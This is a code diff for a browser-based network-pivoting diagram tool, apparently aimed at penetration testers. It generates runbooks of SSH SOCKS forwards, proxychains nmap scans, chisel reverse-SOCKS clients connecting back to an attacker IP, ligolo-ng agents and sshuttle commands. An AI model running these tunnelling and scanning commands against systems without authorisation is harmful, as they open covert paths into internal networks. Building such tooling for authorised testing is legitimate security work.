+      {cx:s.x+sw/2, cy:s.y,      dir:'r'},
+      {cx:s.x,      cy:s.y+sh/2, dir:'b'},
+      {cx:s.x-sw/2, cy:s.y,      dir:'l'},
+    ];
+    for(const c of corners) {
+      if(Math.abs(x-c.cx)<10 && Math.abs(y-c.cy)<10) {
+        resizing=s; resizeCorner=c.dir;
+        resizeStartX=x; resizeStartY=y;
+        resizeStartW=sw; resizeStartH=sh;
+        canvas.classList.add('dragging');
+        return;
+      }
+    }
+  }
+  // Check subnets first (they're on top)
+  for(let i=subnets.length-1;i>=0;i--) {
+    const s=subnets[i], sw=s.w||140, sh=s.h||80;
+    if(Math.abs(x-s.x)<sw/2 && Math.abs(y-s.y)<sh/2) {
+      dragNode=s; dragOffX=x-s.x; dragOffY=y-s.y;
+      selectedNode=s;
+      canvas.classList.add('dragging');
+      renderBottom();
+      return;
+    }
+  }
+  // Check infra nodes
+  for(let i=infraNodes.length-1;i>=0;i--) {
+    const n=infraNodes[i];
+    if(Math.hypot(x-n.x,y-n.y)<24) {
+      dragNode=n; dragOffX=x-n.x; dragOffY=y-n.y;
+      selectedNode=n;
+      canvas.classList.add('dragging');
+      renderBottom();
+      return;
+    }
+  }
+  for(let i=nodes.length-1;i>=0;i--) {
+    const n=nodes[i];
+    if(Math.hypot(x-n.x,y-n.y)<36) {
+      dragNode=n; dragOffX=x-n.x; dragOffY=y-n.y;
+      selectedNode=n;
+      canvas.classList.add('dragging');
+      renderBottom();
+      return;
+    }
+  }
+  selectedNode=null; renderBottom();
+});
+
+// Add/Remove nodes
+function addNode(type) {
+  const cw=W/devicePixelRatio, ch=H/devicePixelRatio;
+  const id = type + '_' + Date.now();
+
+  if(type==='subnet') {
+    // Subnets are independent squares
+    const sub = { id, type:'subnet', label:'SUBNET', ip:'x.x.x.0/24', ports:'', os:'unknown', user:'', iface:'', notes:'',
+      x: cw*0.5 + (Math.random()-0.5)*100,
+      y: ch*0.25 + (Math.random()-0.5)*60,
+      w: 140, h: 80,
+      _placed:true
+    };
+    subnets.push(sub);
+    selectedNode = sub;
+    renderBottom();
+    openModal(sub);
+    saveState();
+    return;
+  }
+
+  const label = 'PIVOT';
+  const ip = 'x.x.x.x';
+  const insertIdx = nodes.length-1;
+  const prev = nodes[insertIdx-1];
+  const next = nodes[insertIdx];
+  const nx = (prev.x + next.x)/2;
+  const ny = (prev.y + next.y)/2;
+  const newNode = { id, type:'pivot', label, ip, ports:'', os:'linux', user:'', iface:'', notes:'', x:nx, y:ny, _placed:true };
+  nodes.splice(insertIdx, 0, newNode);
+  // Re-distribute all nodes evenly
+  const n = nodes.length;
+  nodes.forEach((nd,i) => {
+    nd.x = cw*0.12 + (cw*0.76)*i/(Math.max(n-1,1));
+    nd.y = ch/2;
+  });
+  selectedNode = newNode;
+  renderBottom();
+  openModal(newNode);
+  saveState();
+}
+
+function resetDiagram() {
+  nodes = [
+    { id:'start', type:'starting', label:'ORIGIN', ip:'192.168.1.100', ports:'', os:'linux', user:'kali', iface:'eth0', notes:'', x:0, y:0, _placed:false },
+    { id:'pivot1', type:'pivot', label:'PIVOT', ip:'172.16.0.1', ports:'22', os:'linux', user:'user', iface:'eth0', notes:'', x:0, y:0, _placed:false },
+    { id:'end', type:'ending', label:'TARGET', ip:'10.0.0.10', ports:'80,443', os:'linux', user:'', iface:'', notes:'', x:0, y:0, _placed:false },
+  ];
+  subnets = [];
+  infraNodes = [];
+  selectedNode=null;
+  layoutNodes();
+  renderBottom();
+  localStorage.removeItem('raccoonroute-state');
+}
+
+function exportPNG() {
+  const link=document.createElement('a');
+  link.download='raccoonroute-diagram.png';
+  link.href=canvas.toDataURL('image/png');
+  link.click();
+}
+
+function exportJSON() {
+  const state = {
+    version: 1,
+    exportedAt: new Date().toISOString(),
+    nodes,
+    subnets,
+    infraNodes,
+    meta: { mode: currentMode, tool: selectedTool, zoom, panX, panY }
+  };
+  const blob = new Blob([JSON.stringify(state, null, 2)], { type:'application/json' });
+  const link = document.createElement('a');
+  link.download = 'raccoonroute-' + new Date().toISOString().slice(0,10) + '.json';
+  link.href = URL.createObjectURL(blob);
+  link.click();
+  URL.revokeObjectURL(link.href);
+}
+
+function importJSON() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.accept = '.json,application/json';
+  input.onchange = (e) => {
+    const file = e.target.files[0];
+    if(!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      try {
+        const state = JSON.parse(ev.target.result);
+        if(!state.nodes || !Array.isArray(state.nodes) || state.nodes.length < 2) {
+          alert('Invalid file: must contain at least 2 nodes');
+          return;
+        }
+        nodes = state.nodes;
+        nodes.forEach(n => n._placed = true);
+        subnets = state.subnets || [];
+        infraNodes = state.infraNodes || [];
+        if(state.meta) {
+          if(state.meta.mode) { currentMode = state.meta.mode; }
+          if(state.meta.tool) { selectedTool = state.meta.tool; }
+          if(state.meta.zoom) { zoom = state.meta.zoom; }
+          if(state.meta.panX != null) { panX = state.meta.panX; }
+          if(state.meta.panY != null) { panY = state.meta.panY; }
+        }
+        selectedNode = null;
+        chainFilterNode = null;
+        saveState();
+        renderBottom();
+      } catch(err) {
+        alert('Failed to parse JSON: ' + err.message);
+      }
+    };
+    reader.readAsText(file);
+  };
+  input.click();
+}
+
+// ============ BOTTOM PANEL ============
+function renderBottom() {
+  const panel = document.getElementById('bottom-panel');
+  const node = selectedNode || nodes.find(n=>n.type==='pivot') || nodes[1];
+  const hopIndex = nodes.indexOf(node)+1;
+  const toolList = tools[currentMode] || tools.tunneling;
+  const filteredToolList = (currentMode==='tunneling' && selectedCategory!=='all')
+    ? toolList.filter(t => toolCategories[t] === selectedCategory)
+    : toolList;
+  if(!filteredToolList.includes(selectedTool)) selectedTool = filteredToolList[0] || toolList[0];
+
+  const chainHtml = nodes.map((n,i) =>
+    `<div class="mini-node ${n===node?'active':''} ${n===chainFilterNode?'filtered':''}" onclick="setChainFilter(${i})"><div class="dot" style="background:${n.type==='pivot'?'#4af04a':n.type==='starting'?'#f0a84a':'#4ac8f0'}"></div>${n.label}<br>${n.ip}</div>`
+  ).join('<span class="mini-arrow">&#x2192;</span>');
+
+  const rb = (runbooks[currentMode]||{})[selectedTool] || {setup:[],verify:[],nexthop:[],reference:[]};
+
+  let codeLines, allCode;
+  if(selectedSubTab==='sshconfig') {
+    const cfg = generateSSHConfig();
+    const jump = generateProxyJumpCmd();
+    allCode = cfg + '\n# Single command:\n' + jump;
+    codeLines = allCode.split('\n').map((l,i) => {
+      const cls = l.startsWith('#')?'comment':'cmd';
+      return `<div class="line"><span class="line-no">${String(i+1).padStart(2,'0')}</span><span class="line-content"><span class="${cls}">${highlightCode(l)}</span></span></div>`;
+    }).join('');
+  } else if(selectedSubTab==='allinone') {
+    // Combine all tabs: setup → verify → nexthop → reference
+    const allTabs = ['setup','verify','nexthop','reference'];
+    let combinedLines = [];
+    allTabs.forEach(tab => {
+      const lines = generateChainCommands(selectedTool, tab, chainFilterNode);
+      if(lines.length > 0) {
+        combinedLines.push({type:'comment', text:`# ═══════════════════════════════════════`});
+        combinedLines.push({type:'comment', text:`# ${tab.toUpperCase()}`});
+        combinedLines.push({type:'comment', text:`# ═══════════════════════════════════════`});
+        combinedLines = combinedLines.concat(lines);
+        combinedLines.push({type:'comment', text:''});
+      }
+    });
+    // Append SSH config at the end
+    const cfg = generateSSHConfig();
+    if(cfg && !cfg.startsWith('# No pivots')) {
+      combinedLines.push({type:'comment', text:`# ═══════════════════════════════════════`});
+      combinedLines.push({type:'comment', text:`# SSH CONFIG`});
+      combinedLines.push({type:'comment', text:`# ═══════════════════════════════════════`});
+      cfg.split('\n').forEach(l => combinedLines.push({type: l.startsWith('#')?'comment':'cmd', text:l}));
+      combinedLines.push({type:'comment', text:''});
+      combinedLines.push({type:'comment', text:'# Single ProxyJump command:'});
+      combinedLines.push({type:'cmd', text: generateProxyJumpCmd()});
+    }
+    codeLines = combinedLines.map((l,i) => {
+      const cls = l.type==='comment'?'comment':'cmd';
+      return `<div class="line"><span class="line-no">${String(i+1).padStart(2,'0')}</span><span class="line-content"><span class="${cls}">${highlightCode(l.text)}</span></span></div>`;
+    }).join('');
+    allCode = combinedLines.map(l=>l.text).join('\n');
+  } else {
+    // Use dynamic chain generator for multi-pivot scenarios
+    const dynamicLines = generateChainCommands(selectedTool, selectedSubTab, chainFilterNode);
+    codeLines = dynamicLines.map((l,i) => {
+      const cls = l.type==='comment'?'comment':'cmd';
+      return `<div class="line"><span class="line-no">${String(i+1).padStart(2,'0')}</span><span class="line-content"><span class="${cls}">${highlightCode(l.text)}</span></span></div>`;
+    }).join('');
+    allCode = dynamicLines.map(l=>l.text).join('\n');
+  }
+
+  const osLabel = (node.os||'linux').charAt(0).toUpperCase()+(node.os||'linux').slice(1);
+  const userStr = node.user ? `${node.user}@` : '';
+  const portsStr = node.ports ? ` :${node.ports}` : '';
+
+  panel.innerHTML = `
+    <div class="hop-header">
+      <div class="hop-icon">&#x1F99D;</div>
+      <div>
+        <div class="hop-title">// ${node.label} [${node.type}] -- hop ${hopIndex}${portsStr}</div>
+        <div class="hop-sub">${userStr}${node.ip} / ${osLabel}${node.iface?' / '+node.iface:''} / chain ${hopIndex} of ${nodes.length}</div>
+      </div>
+      <div class="spacer"></div>
+      <button class="copy-btn" onclick="openModal(selectedNode||nodes[1])">[ config ]</button>
+      <button class="copy-btn" onclick="copyAll()">[ copy runbook ]</button>
+    </div>
+    <div class="tags-row">
+      <span class="tag active">${node.type.toUpperCase()}</span>
+      <span class="tag">${osLabel}</span>
+      <span class="tag">${nodes.length} hops</span>
+      ${currentMode==='tunneling'?Object.entries(categoryLabels).map(([k,v])=>`<button class="tag cat ${selectedCategory===k?'active':''}" onclick="selectCategory('${k}')">${v}</button>`).join(''):''}
+      <span class="tag-sep">|</span>
+      ${filteredToolList.map(t=>`<button class="tag tool ${t===selectedTool?'active':''}" onclick="selectTool('${t}')">${t}</button>`).join('')}
+    </div>
+    <div class="mini-chain">${chainFilterNode?`<span class="chain-filter-badge" onclick="setChainFilter(-1)">[x] filtered: ${chainFilterNode.label} — click to show all</span>`:''}${chainHtml}</div>
+    <div class="sub-tabs">
+      <div class="sub-tab ${selectedSubTab==='setup'?'active':''}" onclick="selectSubTab('setup')">SETUP</div>
+      <div class="sub-tab ${selectedSubTab==='verify'?'active':''}" onclick="selectSubTab('verify')">VERIFY</div>
+      <div class="sub-tab ${selectedSubTab==='nexthop'?'active':''}" onclick="selectSubTab('nexthop')">NEXT HOP</div>
+      <div class="sub-tab ${selectedSubTab==='reference'?'active':''}" onclick="selectSubTab('reference')">REFERENCE</div>
+      <div class="sub-tab ${selectedSubTab==='sshconfig'?'active':''}" onclick="selectSubTab('sshconfig')">SSH CONFIG</div>
+      <div class="sub-tab ${selectedSubTab==='allinone'?'active':''}" onclick="selectSubTab('allinone')">ALL IN ONE</div>
+    </div>
+    <div class="code-section">
+      <div class="section-title">// ${selectedSubTab.toUpperCase()} :: ${selectedTool} @ ${node.ip}</div>
+      <div class="code-block">
+        <button class="copy-float" onclick="navigator.clipboard.writeText(\`${escAttr(allCode)}\`)">[ copy ]</button>
+        ${codeLines || '<div class="line"><span class="line-content"><span class="comment"># no commands for this section</span></span></div>'}
+      </div>
+    </div>
+    ${node.notes ? `<div class="code-section"><div class="section-title">// NOTES</div><div class="code-block"><span class="line-content"><span class="comment">${escHtml(node.notes)}</span></span></div></div>` : ''}
+  `;
+}
+
+function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function escAttr(s) { return s.replace(/\\/g,'\\\\').replace(/`/g,'\\`').replace(/\$/g,'\\$'); }
+
+function selectTool(t) { selectedTool=t; renderBottom(); }
+function selectCategory(c) { selectedCategory=c; renderBottom(); }
+function selectSubTab(t) { selectedSubTab=t; renderBottom(); }
+function setChainFilter(idx) {
+  const n = nodes[idx];
+  // Toggle: click same node again to clear filter
+  if(chainFilterNode === n) { chainFilterNode = null; }
+  else if(n && n.type==='pivot') { chainFilterNode = n; }
+  else { chainFilterNode = null; }
+  renderBottom();
+}
+function copyAll() {
+  const node = selectedNode || nodes.find(n=>n.type==='pivot') || nodes[1];
+  const rb = (runbooks[currentMode]||{})[selectedTool] || {};
+  const all = ['setup','verify','nexthop','reference'].map(k=>(rb[k]||[]).map(l=>substituteCmd(l.text,node)).join('\n')).join('\n\n');
+  navigator.clipboard.writeText(all);
+}
+
+// Mode tabs
+document.querySelectorAll('#divider .tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('#divider .tab-btn').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    currentMode = btn.dataset.mode;
+    document.getElementById('mode-name').textContent = btn.textContent;
+    selectedTool = (tools[currentMode]||[])[0]||'SSH';
+    renderBottom();
+  });
+});
+
+// ============ NODE CONFIG MODAL ============
+let editingNode = null;
+
+canvas.addEventListener('dblclick', e => {
+  const {x,y}=canvasCoords(e);
+  // Check subnets
+  for(let i=subnets.length-1;i>=0;i--) {
+    const s=subnets[i], sw=s.w||140, sh=s.h||80;
+    if(Math.abs(x-s.x)<sw/2 && Math.abs(y-s.y)<sh/2) { openModal(s); return; }
+  }
+  // Check infra nodes
+  for(let i=infraNodes.length-1;i>=0;i--) {
+    const n=infraNodes[i];
+    if(Math.hypot(x-n.x,y-n.y)<24) { openModal(n); return; }
+  }
+  for(let i=nodes.length-1;i>=0;i--) {
+    const n=nodes[i];
+    if(Math.hypot(x-n.x,y-n.y)<36) { openModal(n); return; }
+  }
+});
+
+function openModal(node) {
+  editingNode = node;
+  document.getElementById('cfg-label').value = node.label||'';
+  document.getElementById('cfg-type').value = node.type||'pivot';
+  document.getElementById('cfg-ip').value = node.ip||'';
+  document.getElementById('cfg-ports').value = node.ports||'';
+  document.getElementById('cfg-os').value = node.os||'linux';
+  document.getElementById('cfg-user').value = node.user||'';
+  document.getElementById('cfg-iface').value = node.iface||'';
+  document.getElementById('cfg-notes').value = node.notes||'';
+  document.getElementById('cfg-protocol').value = node.protocol||'ssh';
+  document.getElementById('cfg-firewall').value = node.firewall||'no';
+  // Show protocol row only for pivots
+  const protoRow = document.getElementById('cfg-protocol-row');
+  protoRow.classList.toggle('visible', node.type==='pivot');
+  // Don't allow deleting if only 2 chain nodes left (subnets can always be deleted)
+  document.getElementById('cfg-delete').style.display = (node.type!=='subnet' && nodes.length<=2)?'none':'inline-block';
+  document.getElementById('node-modal-overlay').classList.add('open');
+  setTimeout(()=>document.getElementById('cfg-label').focus(),50);
+}
+
+function closeModal() {
+  document.getElementById('node-modal-overlay').classList.remove('open');
+  editingNode = null;
+}
+
+function saveModal() {
+  if(!editingNode) return;
+  editingNode.label = document.getElementById('cfg-label').value.toUpperCase() || editingNode.label;
+  editingNode.type = document.getElementById('cfg-type').value;
+  editingNode.ip = document.getElementById('cfg-ip').value || editingNode.ip;
+  editingNode.ports = document.getElementById('cfg-ports').value;
+  editingNode.os = document.getElementById('cfg-os').value;
+  editingNode.user = document.getElementById('cfg-user').value;
+  editingNode.protocol = document.getElementById('cfg-protocol').value;
+  editingNode.firewall = document.getElementById('cfg-firewall').value;
+  editingNode.iface = document.getElementById('cfg-iface').value;
+  editingNode.notes = document.getElementById('cfg-notes').value;
+  selectedNode = editingNode;
+  closeModal();
+  renderBottom();
+  saveState();
+}
+
+function deleteNode() {
+  if(!editingNode) return;
+  if(editingNode.type==='subnet') {
+    subnets = subnets.filter(s=>s!==editingNode);
+  } else if(editingNode.type==='infra') {
+    infraNodes = infraNodes.filter(n=>n!==editingNode);
+  } else {
+    if(nodes.length<=2) return;
+    nodes = nodes.filter(n=>n!==editingNode);
+  }
+  if(selectedNode===editingNode) selectedNode=null;
+  closeModal();
+  renderBottom();
+  saveState();
+}
+
+// Keyboard shortcut: Escape closes modal, Enter saves
+document.addEventListener('keydown', e => {
+  if(!document.getElementById('node-modal-overlay').classList.contains('open')) return;
+  if(e.key==='Escape') closeModal();
+  if(e.key==='Enter' && e.target.tagName!=='TEXTAREA') saveModal();
+});
+
+// ============ COMMAND SUBSTITUTION ============
+function substituteCmd(text, node) {
+  const idx = nodes.indexOf(node);
+  const prev = idx>0 ? nodes[idx-1] : null;
+  const next = idx<nodes.length-1 ? nodes[idx+1] : null;
+
+  let s = text;
+  s = s.replace(/PIVOT_IP/g, node.ip||'PIVOT_IP');
+  s = s.replace(/ATTACKER_IP|ATTACKER/g, (nodes.find(n=>n.type==='starting')||{}).ip||'ATTACKER_IP');
+  s = s.replace(/TARGET_IP/g, (nodes.find(n=>n.type==='ending')||{}).ip||'TARGET_IP');
+  s = s.replace(/TARGET_SUBNET/g, (()=>{ const t=nodes.find(n=>n.type==='ending'); return t? t.ip.replace(/\.\d+$/,'.0') : 'TARGET_SUBNET'; })());
+  s = s.replace(/NEXT_HOP_IP/g, next ? next.ip : 'NEXT_HOP_IP');
+  s = s.replace(/LHOST/g, (nodes.find(n=>n.type==='starting')||{}).ip||'LHOST');
+  s = s.replace(/LPORT/g, node.ports?.split(',')[0] || 'LPORT');
+  s = s.replace(/RPORT/g, next?.ports?.split(',')[0] || 'RPORT');
+  // Build ProxyJump chain for file transfer / firewall commands
+  const pivots = nodes.filter(n=>n.type==='pivot');
+  const target = nodes.find(n=>n.type==='ending');
+  const proxyJump = pivots.map(p=>`${p.user||'user'}@${p.ip}`).join(',');
+  const targetUser = target?.user||'user';
+  const targetIp = target?.ip||'TARGET_IP';
+  // Replace "ssh -J user@PIVOT_IP user@TARGET_IP" pattern
+  s = s.replace(/-J user@PIVOT_IP user@TARGET_IP/g, `-J ${proxyJump} ${targetUser}@${targetIp}`);
+  s = s.replace(/-J user@PIVOT_IP -/g, `-J ${proxyJump} -`);
+  s = s.replace(/-J user@PIVOT_IP$/gm, `-J ${proxyJump}`);
+  // Replace remaining placeholders
+  if(node.user) s = s.replace(/user@/g, node.user+'@');
+  if(node.iface) s = s.replace(/eth0/g, node.iface);
+  return s;
+}
+
+// ============ DYNAMIC CHAIN COMMAND GENERATOR ============
+// Generates commands that adapt to the actual number of pivots
+function generateChainCommands(tool, subTab, filterNode) {
+  const pivots = nodes.filter(n=>n.type==='pivot');
+  const attacker = nodes.find(n=>n.type==='starting');
+  const target = nodes.find(n=>n.type==='ending');
+  const rb = (runbooks[currentMode]||{})[tool] || {};
+  const staticCmds = rb[subTab] || [];
+
+  // If 0 or 1 pivot, or non-tunneling mode, or subtabs like setup/verify — use static with substitution
+  if(currentMode !== 'tunneling' || pivots.length <= 1 || subTab === 'setup' || subTab === 'verify') {
+    const node = filterNode || pivots[0] || nodes[1];
+    return staticCmds.map(l => ({ type:l.type, text: substituteCmd(l.text, node) }));
+  }
+
+  // For nexthop/reference with multiple pivots, generate dynamic per-hop commands
+  const lines = [];
+  const filteredPivots = filterNode ? [filterNode] : pivots;
+
+  if(tool === 'SSH' && subTab === 'nexthop') {
+    // Dynamic SOCKS chain for each pivot
+    if(!filterNode) {
+      lines.push({type:'comment', text:`# === Full chain: ${pivots.length} pivots ===`});
+      lines.push({type:'comment', text:'# Proxychains config (/etc/proxychains.conf):'});
+      lines.push({type:'comment', text:'#   dynamic_chain'});
+      pivots.forEach((p,i) => {
+        lines.push({type:'comment', text:`#   socks4 127.0.0.1 ${9050+i}`});
+      });
+      lines.push({type:'comment', text:''});
+    }
+    filteredPivots.forEach((p,i) => {
+      const hopIdx = pivots.indexOf(p);
+      const port = 9050 + hopIdx;
+      const prev = hopIdx > 0 ? pivots[hopIdx-1] : null;
+      const next = hopIdx < pivots.length-1 ? pivots[hopIdx+1] : target;
+      const user = p.user || 'user';
+
+      lines.push({type:'comment', text:`# --- Hop ${hopIdx+1}: ${p.label} (${p.ip}) → port ${port} ---`});
+      if(hopIdx === 0) {
+        lines.push({type:'cmd', text:`ssh -D 127.0.0.1:${port} -N -f ${user}@${p.ip}`});
+      } else {
+        // Must go through previous proxies
+        const jumps = pivots.slice(0, hopIdx).map(pp=>`${pp.user||'user'}@${pp.ip}`).join(',');
+        lines.push({type:'cmd', text:`ssh -D 127.0.0.1:${port} -N -f ${user}@${p.ip} -J ${jumps}`});
+      }
+      if(next) {
+        lines.push({type:'cmd', text:`proxychains nmap -sT -Pn -p- ${next.ip}`});
+      }
+      lines.push({type:'comment', text:''});
+    });
+    // Final single-command alternative
+    if(!filterNode && pivots.length > 1) {
+      const jumps = pivots.map(p=>`${p.user||'user'}@${p.ip}`).join(',');
+      lines.push({type:'comment', text:'# Or single ProxyJump command to reach target:'});
+      lines.push({type:'cmd', text:`ssh -J ${jumps} ${target?.user||'user'}@${target?.ip||'TARGET_IP'}`});
+    }
+    return lines;
+  }
+
+  if(tool === 'SSH' && subTab === 'reference') {
+    // Show per-hop local/remote forwards and the full ProxyJump
+    filteredPivots.forEach((p,i) => {
+      const hopIdx = pivots.indexOf(p);
+      const user = p.user || 'user';
+      const next = hopIdx < pivots.length-1 ? pivots[hopIdx+1] : target;
+      const port = p.ports?.split(',')[0] || '22';
+
+      lines.push({type:'comment', text:`# --- ${p.label} (hop ${hopIdx+1}) ---`});
+      if(hopIdx === 0) {
+        lines.push({type:'comment', text:'# Local port forward'});
+        lines.push({type:'cmd', text:`ssh -L ${port}:${next?.ip||'TARGET_IP'}:${next?.ports?.split(',')[0]||'80'} ${user}@${p.ip}`});
+        lines.push({type:'comment', text:'# Remote port forward'});
+        lines.push({type:'cmd', text:`ssh -R 2222:*:2222 ${user}@${p.ip}`});
+      } else {
+        const jumps = pivots.slice(0, hopIdx).map(pp=>`${pp.user||'user'}@${pp.ip}`).join(',');
+        lines.push({type:'comment', text:'# Local forward through previous hops'});
+        lines.push({type:'cmd', text:`ssh -L ${port}:${next?.ip||'TARGET_IP'}:${next?.ports?.split(',')[0]||'80'} ${user}@${p.ip} -J ${jumps}`});
+      }
+      lines.push({type:'comment', text:''});
+    });
+    if(!filterNode) {
+      lines.push({type:'comment', text:'# === Double/Multi Pivot (stacked proxychains) ==='});
+      lines.push({type:'comment', text:'# /etc/proxychains.conf entries:'});
+      pivots.forEach((p,i) => lines.push({type:'comment', text:`#   socks4 127.0.0.1 ${9050+i}`}));
+      const jumps = pivots.map(p=>`${p.user||'user'}@${p.ip}`).join(',');
+      lines.push({type:'cmd', text:`ssh -J ${jumps} ${target?.user||'user'}@${target?.ip||'TARGET_IP'}`});
+    }
+    return lines;
+  }
+
+  if(tool === 'Chisel' && subTab === 'nexthop') {
+    const attackerIp = attacker?.ip || 'ATTACKER_IP';
+    filteredPivots.forEach((p,i) => {
+      const hopIdx = pivots.indexOf(p);
+      const port = 8000 + hopIdx;
+      const user = p.user || 'user';
+      lines.push({type:'comment', text:`# --- Hop ${hopIdx+1}: ${p.label} (${p.ip}) ---`});
+      if(hopIdx === 0) {
+        lines.push({type:'comment', text:'# Attacker: start server'});
+        lines.push({type:'cmd', text:`chisel server -p ${port} --reverse`});
+        lines.push({type:'comment', text:'# Pivot: connect back'});
+        lines.push({type:'cmd', text:`./chisel client ${attackerIp}:${port} R:socks`});
+      } else {
+        lines.push({type:'comment', text:`# Chain through previous pivot (port ${8000+hopIdx-1})`});
+        lines.push({type:'cmd', text:`chisel server -p ${port} --reverse`});
+        lines.push({type:'cmd', text:`./chisel client ${pivots[hopIdx-1].ip}:${port} R:socks`});
+      }
+      lines.push({type:'comment', text:''});
+    });
+    return lines;
+  }
+
+  if(tool === 'Ligolo-ng' && subTab === 'nexthop') {
+    const attackerIp = attacker?.ip || 'ATTACKER_IP';
+    filteredPivots.forEach((p,i) => {
+      const hopIdx = pivots.indexOf(p);
+      const next = hopIdx < pivots.length-1 ? pivots[hopIdx+1] : target;
+      const subnet = next ? next.ip.replace(/\.\d+$/,'.0') : 'TARGET_SUBNET';
+      lines.push({type:'comment', text:`# --- Hop ${hopIdx+1}: ${p.label} (${p.ip}) ---`});
+      lines.push({type:'cmd', text:`./agent -connect ${hopIdx===0 ? attackerIp : pivots[hopIdx-1].ip}:443 -ignore-cert`});
+      lines.push({type:'cmd', text:'session'});
+      lines.push({type:'cmd', text:`sudo ip r add ${subnet}/24 dev ligolo`});
+      lines.push({type:'cmd', text:'start'});
+      lines.push({type:'comment', text:''});
+    });
+    return lines;
+  }
+
+  if(tool === 'SSHuttle' && subTab === 'nexthop') {
+    filteredPivots.forEach((p,i) => {
+      const hopIdx = pivots.indexOf(p);
+      const next = hopIdx < pivots.length-1 ? pivots[hopIdx+1] : target;
+      const subnet = next ? next.ip.replace(/\.\d+$/,'.0/24') : 'TARGET_SUBNET/24';
+      const user = p.user || 'user';
+      lines.push({type:'comment', text:`# --- Hop ${hopIdx+1}: ${p.label} (${p.ip}) ---`});
+      if(hopIdx === 0) {
+        lines.push({type:'cmd', text:`sshuttle -vvr ${user}@${p.ip} ${subnet}`});
+      } else {
+        const jumps = pivots.slice(0, hopIdx).map(pp=>`${pp.user||'user'}@${pp.ip}`).join(',');
+        lines.push({type:'cmd', text:`sshuttle -vvr ${user}@${p.ip} --ssh-cmd "ssh -J ${jumps}" ${subnet}`});
+      }
+      lines.push({type:'comment', text:''});
+    });
+    return lines;
+  }
+
+  // Default fallback: static commands with substitution for selected node
+  const node = filterNode || pivots[0] || nodes[1];
+  return staticCmds.map(l => ({ type:l.type, text: substituteCmd(l.text, node) }));
+}
+
+// ============ SYNTAX HIGHLIGHTING ============
+function highlightCode(text) {
+  let h = escHtml(text);
+  // IPs
+  h = h.replace(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:\/\d{1,2})?)/g, '<span style="color:#f0a84a">$1</span>');
+  // Ports (after colon or standalone numbers that look like ports)
+  h = h.replace(/:(\d{2,5})\b/g, ':<span style="color:#4af04a">$1</span>');
+  // SSH flags
+  h = h.replace(/(\s)(-[DLRNfCvJMSwAXTtgo]\b)/g, '$1<span style="color:#a371f7">$2</span>');
+  // Known commands
+  h = h.replace(/^(ssh|scp|sftp|nmap|proxychains[4]?|chisel|socat|iptables|nft|ufw|sshuttle|openssl|nc|rsync|autossh|gost|gobuster|curl|sudo|tar|sha256sum|firewall-cmd|pfctl)\b/gm,
+    '<span style="color:#4ac8f0">$1</span>');
+  return h;
+}
+
+// ============ COMPONENT CATALOG ============
+const componentCatalog = {
+  identity: { color:'#a855f7', label:'Identity Providers',
+    items:['Keycloak','Authentik','Dex','Okta','Auth0','Entra ID','Ping Identity','CyberArk','OneLogin','Zitadel'] },
+  network: { color:'#f0a84a', label:'Network Devices',
+    items:['Cisco','Arista','Palo Alto','Fortinet','Juniper','F5','Ubiquiti','VMware NSX','Dell','Extreme'] },
+  database: { color:'#14b8a6', label:'Databases',
+    items:['PostgreSQL','MySQL','MSSQL','Oracle DB','MongoDB','Redis','Cassandra','MariaDB','OpenSearch','CockroachDB'] },
+  cloud: { color:'#4ac8f0', label:'Cloud Platforms',
+    items:['AWS','GCP','Azure','DigitalOcean','Hetzner','Linode','OVHcloud','Vultr','IBM Cloud','Oracle Cloud'] },
+};
+
+let infraNodes = []; // Independent infra component nodes on canvas
+
+function openComponentCatalog() {
+  document.getElementById('comp-modal-overlay').classList.add('open');
+  renderCompList();
+  setTimeout(()=>document.getElementById('comp-search').focus(),50);
+}
+function closeCompCatalog() {
+  document.getElementById('comp-modal-overlay').classList.remove('open');
+}
+function filterComponents() { renderCompList(); }
+
+function renderCompList() {
+  const search = (document.getElementById('comp-search').value||'').toLowerCase();
+  let html = '';
+  for(const [cat, data] of Object.entries(componentCatalog)) {
+    const filtered = data.items.filter(i=>i.toLowerCase().includes(search));
+    if(filtered.length===0) continue;
+    html += `<div class="comp-category">
+      <div class="comp-category-title"><span class="cat-color" style="background:${data.color}"></span>${data.label}</div>
+      <div class="comp-grid">${filtered.map(i=>`<div class="comp-item" onclick="addInfraNode('${cat}','${i}')">${i}</div>`).join('')}</div>
+    </div>`;
+  }
+  document.getElementById('comp-list').innerHTML = html || '<p style="color:#3a6a3a;font-size:11px;padding:8px">No matches</p>';
+}
+
+function addInfraNode(category, label) {
+  const cw=W/devicePixelRatio, ch=H/devicePixelRatio;
+  const color = componentCatalog[category].color;
+  const node = {
+    id:'infra_'+Date.now()+'_'+Math.random().toString(36).slice(2,6),
+    type:'infra', category, label, ip:'', notes:'', color,
+    x: cw*0.3 + Math.random()*cw*0.4,
+    y: ch*0.3 + Math.random()*ch*0.4,
+  };
+  infraNodes.push(node);
+  closeCompCatalog();
+  saveState();
+}
+
+// ============ DRAW INFRA NODES ============
+function drawInfraNode(node, time) {
+  const glow = node.color || '#4ac8f0';
+  const r = 22;
+  const pulseR = r + Math.sin(time*0.004)*1;
+
+  ctx.beginPath(); ctx.arc(node.x, node.y, pulseR, 0, Math.PI*2);
+  ctx.fillStyle = '#0c1a0c'; ctx.fill();
+  ctx.strokeStyle = glow; ctx.lineWidth=1.5; ctx.stroke();
+
+  // Category icon (letter)
+  ctx.textAlign='center'; ctx.textBaseline='middle';
+  ctx.font='bold 12px JetBrains Mono,monospace'; ctx.fillStyle=glow;
+  ctx.fillText(node.label.charAt(0).toUpperCase(), node.x, node.y);
+
+  // Label below
+  ctx.textBaseline='top'; ctx.font='8px JetBrains Mono,monospace'; ctx.fillStyle=glow+'cc';
+  ctx.fillText(node.label, node.x, node.y+pulseR+4);
+  if(node.ip) {
+    ctx.fillStyle='#6fbf6f'; ctx.font='7px JetBrains Mono,monospace';
+    ctx.fillText(node.ip, node.x, node.y+pulseR+14);
+  }
+
+  if(node===selectedNode) {
+    ctx.beginPath(); ctx.arc(node.x, node.y, pulseR+5, 0, Math.PI*2);
+    ctx.strokeStyle=glow+'55'; ctx.lineWidth=2; ctx.setLineDash([3,3]);
+    ctx.lineDashOffset=-time*0.02; ctx.stroke(); ctx.setLineDash([]);
+  }
+}
+
